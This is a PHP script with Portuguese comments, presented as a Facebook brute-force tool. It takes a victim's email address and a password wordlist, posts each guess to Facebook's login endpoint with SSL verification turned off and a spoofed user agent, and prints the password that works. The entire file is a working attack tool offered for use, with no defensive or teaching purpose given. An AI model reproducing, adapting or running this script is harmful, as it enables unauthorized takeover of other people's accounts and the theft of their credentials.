<?php
	/*
		Criado Por Pablo Santhus
		Facebook Brute Force PHP
		facebook.php v 1.0
		
		Ajuda: php facebook.php emaildavitima@hotmail.com wordlist.txt
		
		obs: após algumas tentativas o facebook irá bloqueia o acesso
		a conta por algumas horas.
	*/
	error_reporting(0);
	set_time_limit(0);
	print menu();

	$email = $argv[1];
	$dicionario = $argv[2];

function menu(){
print"--------------------------------------------------------------------\n";
print"\n";
echo"		 (                         (                                 \n";     
echo" )\ )          )  (        )\ )                 )    )            	 \n";
echo"(()/(    )  ( /(  )\      (()/(    )         ( /( ( /(    (       	 \n";
echo"/(_))( /(  )\())((_) (    /(_))( /(   (     )\()))\())  ))\  (      \n";
echo"(_))  )(_))((_)\  _   )\  (_))  )(_))  )\ ) (_))/((_)\  /((_) )\    \n";
echo"| _ \((_)_ | |(_)| | ((_) / __|((_)_  _(_/( | |_ | |(_)(_))( ((_) 	 \n";
echo"|  _// _` || '_ \| |/ _ \ \__ \/ _` || ' \))|  _|| ' \ | || |(_-< 	 \n";
echo"|_|  \__,_||_.__/|_|\___/ |___/\__,_||_||_|  \__||_||_| \_,_|/__/	 \n";
print"\n";
echo "Facebook Brute \n";
echo "Criado por Pablo Santhus \n";
echo "exemplo: php facebook.php seuemail@gmail.com wordlist.txt 	  \n";
print "\n";
print"--------------------------------------------------------------------\n\n";
}

	function brute($usuario, $senha){
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, "https://login.facebook.com/login.php?m&next=http://m.facebook.com/home.php");
		curl_setopt($ch, CURLOPT_HEADER, 1);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_POST, true);
		curl_setopt($ch, CURLOPT_POSTFIELDS, "email=$usuario&pass=$senha&login=Login");
		curl_setopt($ch, CURLOPT_USERAGENT, "Opera/9.21 (Windows NT 5.1; U; tr)");
		curl_setopt($ch, CURLOPT_COOKIE, "datr=80ZzUfKqDOjwL8pauwqMjHTa");
		curl_setopt($ch, CURLOPT_COOKIEFILE, "cookie.txt");
		curl_setopt($ch, CURLOPT_COOKIEJAR, "cookies.txt");
		$source = curl_exec($ch);
		$fp = fopen("log.html", "w");
		fwrite($fp, $source);
		if(eregi("https://m.facebook.com/home.php", $source)){
			return true;
		}else{
			return false;
		}
	}

	if(!is_file($dicionario)){
		print "\nAdicione um dicionario!\n";
		print"--------------------------------------------------------------------\n";
		exit;
	}

if(isset($argv[1]) && isset($argv[2])){
	$lines = file($dicionario);
	foreach($lines as $line){
		$line = str_replace("\r", "", $line);
		$line = str_replace("\n", "", $line);
		if(brute($email, $line)){
			print"--------------------------------------------------------------------\n";
			print "\n";
			print "	[+] Email: ".$email. " Senha: ".$line.  "\n";
			print "\n";
			print"--------------------------------------------------------------------\n";
			exit;
		}else{
			print "[-] Email: ".$email. " Senha Incorreta: ".$line."\n";
		}
	}
}
	

?>
